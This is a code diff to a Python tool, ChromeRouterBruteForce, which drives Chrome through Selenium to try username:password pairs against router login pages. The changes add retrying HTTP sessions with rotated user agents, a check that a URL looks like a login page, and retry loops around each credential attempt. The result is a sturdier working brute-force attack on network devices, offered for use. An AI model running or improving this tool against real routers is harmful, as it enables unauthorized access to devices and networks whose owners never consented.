@@ -34,7 +34,7 @@ try:
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
-    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
+    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException, ElementNotInteractableException, StaleElementReferenceException
     CHROME_AVAILABLE = True
 except ImportError:
     CHROME_AVAILABLE = False
@@ -121,6 +121,59 @@ USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
 ]
 
+class AdvancedWaitStrategies:
+    """Advanced wait strategies for better element interaction"""
+    
+    @staticmethod
+    def wait_for_element_clickable(driver, locator, timeout=10):
+        """Wait for element to be clickable"""
+        try:
+            wait = WebDriverWait(driver, timeout)
+            element = wait.until(EC.element_to_be_clickable(locator))
+            return element
+        except TimeoutException:
+            return None
+    
+    @staticmethod
+    def wait_for_element_visible(driver, locator, timeout=10):
+        """Wait for element to be visible"""
+        try:
+            wait = WebDriverWait(driver, timeout)
+            element = wait.until(EC.visibility_of_element_located(locator))
+            return element
+        except TimeoutException:
+            return None
+    
+    @staticmethod
+    def wait_for_element_present(driver, locator, timeout=10):
+        """Wait for element to be present in DOM"""
+        try:
+            wait = WebDriverWait(driver, timeout)
+            element = wait.until(EC.presence_of_element_located(locator))
+            return element
+        except TimeoutException:
+            return None
+    
+    @staticmethod
+    def wait_for_page_load(driver, timeout=30):
+        """Wait for page to load completely"""
+        try:
+            wait = WebDriverWait(driver, timeout)
+            wait.until(lambda driver: driver.execute_script("return document.readyState") == "complete")
+            return True
+        except TimeoutException:
+            return False
+    
+    @staticmethod
+    def wait_for_url_change(driver, initial_url, timeout=10):
+        """Wait for URL to change from initial URL"""
+        try:
+            wait = WebDriverWait(driver, timeout)
+            wait.until(lambda driver: driver.current_url != initial_url)
+            return True
+        except TimeoutException:
+            return False
+
 class ChromeRouterBruteForce:
     def __init__(self, login_urls, threads=1, timeout=10, headless=False, enable_screenshot=True):
         self.login_urls = list(set(login_urls))  # Remove duplicates
@@ -129,6 +182,27 @@ class ChromeRouterBruteForce:
         self.headless = headless
         self.enable_screenshot = enable_screenshot
         self.lock = threading.Lock()
+        self.wait_strategies = AdvancedWaitStrategies()
+        self.session = requests.Session()
+        self.setup_session()
+    
+    def setup_session(self):
+        """Setup requests session with retry strategy"""
+        retry_strategy = Retry(
+            total=3,
+            backoff_factor=1,
+            status_forcelist=[429, 500, 502, 503, 504],
+        )
+        adapter = HTTPAdapter(max_retries=retry_strategy)
+        self.session.mount("http://", adapter)
+        self.session.mount("https://", adapter)
+        self.session.headers.update({
+            'User-Agent': random.choice(USER_AGENTS),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+        })
         
     def create_chrome_driver(self):
         """Create Chrome driver with optimized settings"""
@@ -392,6 +466,53 @@ class ChromeRouterBruteForce:
             print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
             return None
     
+    def pre_validate_url(self, url):
+        """Pre-validate URL before Chrome automation"""
+        try:
+            print(f"{Colors.BLUE}[*] Pre-validating URL: {url}{Colors.END}")
+            
+            # Check if URL is reachable
+            response = self.session.get(url, timeout=10, allow_redirects=True)
+            
+            # Check HTTP status code
+            if response.status_code >= 400:
+                print(f"{Colors.YELLOW}[-] HTTP Error {response.status_code}: {url}{Colors.END}")
+                return False
+            
+            # Check for error pages in content
+            content = response.text.lower()
+            error_indicators = [
+                'this site can\'t be reached', 'site can\'t be reached', 'can\'t be reached',
+                'this page isn\'t working', 'page isn\'t working', 'isn\'t working',
+                'connection refused', 'connection timed out', 'timeout',
+                '404 not found', '403 forbidden', '500 internal server error',
+                'server not found', 'dns_probe_finished_nxdomain',
+                'err_connection_refused', 'err_connection_timed_out',
+                'err_name_not_resolved', 'err_internet_disconnected'
+            ]
+            
+            if any(error in content for error in error_indicators):
+                print(f"{Colors.YELLOW}[-] Error page detected in pre-validation{Colors.END}")
+                return False
+            
+            # Check for login page indicators
+            login_indicators = [
+                'login', 'signin', 'sign-in', 'sign_in', 'auth', 'authentication',
+                'username', 'password', 'enter credentials', 'please login'
+            ]
+            
+            login_count = sum(1 for indicator in login_indicators if indicator in content)
+            if login_count >= 2:
+                print(f"{Colors.GREEN}[+] Login page indicators found: {login_count}{Colors.END}")
+                return True
+            else:
+                print(f"{Colors.YELLOW}[-] Insufficient login indicators: {login_count}{Colors.END}")
+                return False
+                
+        except Exception as e:
+            print(f"{Colors.YELLOW}[-] Pre-validation failed: {e}{Colors.END}")
+            return False
+
     def detect_authentication_type(self, driver, url):
         """Detect authentication type using Chrome"""
         try:
@@ -750,11 +871,16 @@ class ChromeRouterBruteForce:
             return False, None
 
     def test_credentials_with_chrome(self, url, username, password):
-        """Test credentials using Chrome automation with multiple auth types"""
+        """Test credentials using Chrome automation with advanced validation"""
         driver = None
         success = False
         try:
             print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
+            
+            # Pre-validate URL before Chrome automation
+            if not self.pre_validate_url(url):
+                print(f"{Colors.YELLOW}[-] URL pre-validation failed: {url}{Colors.END}")
+                return False, None, None
             
             # Create Chrome driver
             driver = self.create_chrome_driver()
@@ -763,14 +889,32 @@ class ChromeRouterBruteForce:
             
             # Set page load timeout
             driver.set_page_load_timeout(30)
+            driver.implicitly_wait(10)
             
-            # Navigate to URL
-            try:
-                driver.get(url)
-                time.sleep(3)  # Wait for page to load
-            except Exception as e:
-                print(f"{Colors.YELLOW}[-] Page load timeout or error: {e}{Colors.END}")
-                return False, None, None
+            # Navigate to URL with retry mechanism
+            max_retries = 3
+            for attempt in range(max_retries):
+                try:
+                    driver.get(url)
+                    # Wait for page to load completely
+                    if self.wait_strategies.wait_for_page_load(driver, 15):
+                        break
+                    else:
+                        if attempt < max_retries - 1:
+                            print(f"{Colors.YELLOW}[-] Page load timeout, retrying... ({attempt + 1}/{max_retries}){Colors.END}")
+                            time.sleep(2)
+                            continue
+                        else:
+                            print(f"{Colors.YELLOW}[-] Page load failed after {max_retries} attempts{Colors.END}")
+                            return False, None, None
+                except Exception as e:
+                    if attempt < max_retries - 1:
+                        print(f"{Colors.YELLOW}[-] Navigation error, retrying... ({attempt + 1}/{max_retries}): {e}{Colors.END}")
+                        time.sleep(2)
+                        continue
+                    else:
+                        print(f"{Colors.YELLOW}[-] Navigation failed after {max_retries} attempts: {e}{Colors.END}")
+                        return False, None, None
             
             # Get initial page info
             initial_url = driver.current_url
